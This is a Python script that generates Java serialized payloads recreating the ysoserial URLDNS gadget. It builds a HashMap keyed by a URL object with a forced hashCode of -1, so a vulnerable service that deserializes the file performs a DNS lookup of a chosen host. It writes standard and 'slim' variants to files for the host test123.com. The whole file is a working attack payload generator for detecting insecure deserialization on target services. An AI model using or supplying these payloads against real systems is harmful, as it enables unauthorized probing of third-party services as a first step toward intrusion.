import deserek 
from javaObj import * 
from javaCommons import *


class j_HashMap__slim(j_HashMap):
  #_class_name = "java.util.HashMap"
  #_uid = 362498820763181265
  _fields = {}
    
  def constructor(self):
    self.MAP = {}

  def writeObject(self, wr: JavaObjectWriter):
    self.defaultWriteObject()
    size = len(self.MAP)
    with wr.binary_block() as binwr:
      binwr.writeInt(0x00) # buckets
      binwr.writeInt(size)  # size
    for k,v in self.MAP.items():
      print("pack k :",k)
      wr.write(k.pack_for_deserek())
      print("pack v :",v)
      wr.write(v.pack_for_deserek())
      

class j_java_net_URL_slim(j_java_net_URL): # JavaSerializableClass):
  #_class_name = "java.net.URL"
  #_uid = -7627629688361524110
  
  _fields : dict = {
    "authority" : JavaStringField(""),
    "protocol"  : JavaStringField("ftp"),
  }

def YsoSerial_URL(host):
  h = j_HashMap()
  i1 = j_simpleInteger()
  i1.value = 42

  u1 = j_java_net_URL()
  u1.hashCode = -1
  u1.port = 80
  u1.protocol = "https"
  u1.authority = host
  u1.file = "a"
  h.MAP[u1] = i1

  return deserek.do_serialize(h.pack_for_deserek())


def YsoSerial_URL__slim(host):
  h = j_HashMap__slim()
  s1 = j_String("W")
  u1 = j_java_net_URL_slim()
  h.MAP[u1] = s1
  return deserek.do_serialize(h.pack_for_deserek())



if __name__ == '__main__':
  print(">>> save standard into 'tmp_yso1.bin' ")
  open('tmp_yso1.bin',"wb").write( YsoSerial_URL("test123.com"))
  
  print(">>> save slim into 'tmp_yso2.bin' ")
  open('tmp_yso2.bin',"wb").write( YsoSerial_URL__slim("test123.com"))

   